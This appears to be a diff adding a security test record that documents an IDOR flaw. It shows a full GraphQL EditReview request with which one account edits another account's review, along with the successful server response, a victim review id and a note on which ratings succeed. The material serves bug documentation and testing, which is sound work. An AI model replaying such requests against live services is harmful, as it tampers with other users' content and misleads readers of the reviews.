@@ -1,0 +1,25 @@
+# IDOR — account B edits account A's review
+# Run: 2026-11-27, B profile, fresh login (zss 30), EditReview via /gql/batch.
+# Victim: 09773aYTIbSk12Zt2sHnnQ, owner A, business cQdLIIzsExv9LF3s4s7Hzw.
+# Transcribed from flow.log record e=idor.
+
+POST /gql/batch
+content-type: application/json
+x-apollo-operation-name: EditReview
+
+[{"operationName":"EditReview",
+  "variables":{"input":{
+    "reviewEncid":"09773aYTIbSk12Zt2sHnnQ",
+    "rating":5,
+    "comment":"IDOR marker — written by account B",
+    "reviewOrigin":"biz-details-war-button"}},
+  "extensions":{"operationType":"mutation",
+    "documentId":"455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609"}}]
+
+HTTP 200
+
+[{"data":{"editReview":{"__typename":"EditReviewSuccess",
+  "review":{"encid":"09773aYTIbSk12Zt2sHnnQ","__typename":"Review"}}}}]
+
+# B's session had no relationship to A or to the review.
+# A variant with rating 1 returned UPSTREAM_SERVICE_ERROR twice; 5-star edits succeeded.
